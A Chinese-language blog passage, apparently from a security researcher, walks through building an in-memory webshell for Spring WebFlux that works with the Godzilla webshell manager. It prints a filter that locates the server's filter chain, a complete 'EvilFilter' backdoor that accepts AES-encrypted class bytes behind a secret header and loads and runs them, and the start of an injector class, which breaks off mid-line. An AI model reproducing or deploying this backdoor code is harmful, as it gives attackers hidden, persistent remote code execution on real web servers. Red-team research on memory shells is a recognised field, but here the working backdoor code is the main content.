<p>那么接下来就是需要寻找FilteringWebHandler类中的chain属性，也就是DefaultWebFilterChain这个实例了。这里可以用到c0ny1师傅的一个工具：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher">c0ny1&#x2F;java-object-searcher: java内存对象搜索辅助工具</a>，该工具可以方便我们定位想要的对象处于在哪个位置。</p>
<p>因此用该工具去寻找我们自定义的过滤器也好，或者直接找DefaultWebFilterChain实例也好，都是可行的。</p>
<p>我这里新定义一个Filter来查找。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.filter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;  </span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;  </span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;  </span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;  </span><br><span class="line"><span class="keyword">import</span> java.time.Duration;  </span><br><span class="line"><span class="keyword">import</span> java.time.Instant;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@Order(2)</span> <span class="comment">// 过滤器执行顺序（数值越小优先级越高）  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SearchFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;  </span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;SearchFilter&quot;</span>).build());  </span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());  </span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);  </span><br><span class="line">        searcher.setBlacklists(blacklists);  </span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);  </span><br><span class="line">        searcher.setMax_search_depth(<span class="number">15</span>);  </span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;E:\\&quot;</span>);  </span><br><span class="line">        searcher.searchObject();  </span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果在指定的目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [3] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; </span><br><span class="line">      ---&gt; this$0 = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; </span><br><span class="line">       ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; </span><br><span class="line">        ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; </span><br><span class="line">         ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; </span><br><span class="line">          ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; </span><br><span class="line">            ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; </span><br><span class="line">             ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125; </span><br><span class="line">              ---&gt; allFilters = &#123;java.util.List&lt;org.springframework.web.server.WebFilter&gt;&#125; </span><br><span class="line">               ---&gt; [1] = &#123;cmisl.webfluxmemoryshell.filter.SearchFilter&#125;</span><br></pre></td></tr></table></figure>

<p>到此为止可以宣布完成了，由于最近项目就是经常要看哥斯拉源码，下面直接编写哥斯拉的Shell了。先写个恶意WebFilter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.filter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBuffer;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBufferFactory;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;  </span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;  </span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;  </span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;  </span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@Order(3)</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;082e34fbef497bb1&quot;</span>; <span class="comment">// key  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">headerValue</span> <span class="operator">=</span> <span class="string">&quot;cmisl&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);  </span><br><span class="line">    Class payload;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);  </span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            MessageDigest m;  </span><br><span class="line">            m = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);  </span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());  </span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> ret;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Class base64;  </span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);  </span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();  </span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;  </span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> exchange.getRequest().getHeaders();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> headers.getFirst(<span class="string">&quot;cmisl&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">bufferStream</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">if</span> (headers.getFirst(<span class="built_in">this</span>.headerName) != <span class="literal">null</span> &amp;&amp; headers.getFirst(<span class="built_in">this</span>.headerName).contains(<span class="built_in">this</span>.headerValue)) &#123;  </span><br><span class="line">  </span><br><span class="line">            bufferStream = exchange.getFormData().flatMap(c -&gt; &#123;  </span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> c.getFirst(pass);  </span><br><span class="line">                    <span class="type">byte</span>[] data = x(base64Decode(id), <span class="literal">false</span>);  </span><br><span class="line">                    <span class="keyword">if</span> (store.get(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;  </span><br><span class="line">                        store.put(<span class="string">&quot;payload&quot;</span>, defineClass(data));  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        store.put(<span class="string">&quot;parameters&quot;</span>, data);  </span><br><span class="line">                        <span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">                        <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) store.get(<span class="string">&quot;payload&quot;</span>)).newInstance();  </span><br><span class="line">                        f.equals(arrOut);  </span><br><span class="line">                        f.equals(data);  </span><br><span class="line">                        result.append(md5.substring(<span class="number">0</span>, <span class="number">16</span>));  </span><br><span class="line">                        f.toString();  </span><br><span class="line">                        result.append(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));  </span><br><span class="line">                        result.append(md5.substring(<span class="number">16</span>));  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;  </span><br><span class="line">                    result.append(ex.getMessage());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> Mono.just(<span class="keyword">new</span> <span class="title class_">DefaultDataBufferFactory</span>().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));  </span><br><span class="line">            &#125;);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> exchange.getResponse().writeWith((Mono&lt;DefaultDataBuffer&gt;) bufferStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>密码cmisl，密钥cmisl，请求头cmisl: cmisl。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250611095826451.png"></p>
<p>然后写个注入Webfilter的代码，也就是注入器。在此之前先把刚刚的EvilFilter，首先编译成class，然后gzip压缩，压缩后的文件base64编码。这就是在注入器中要注入的恶意过滤器的编码了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250611101352481.png"></p>
<p>注入器的代码也不是很难，模仿哥斯拉的其他注入器模板就行了。下面的再简单修改一下就能写进哥斯拉了，哥斯拉本身还是没有写这个类型的内存马的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.webfluxmemoryshell.inject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebHandler;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.DefaultWebFilterChain;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilInjection</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUrlPattern</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/*&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getClassName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cmisl.webfluxmemoryshell.filter.EvilFilter&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBase64String</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span 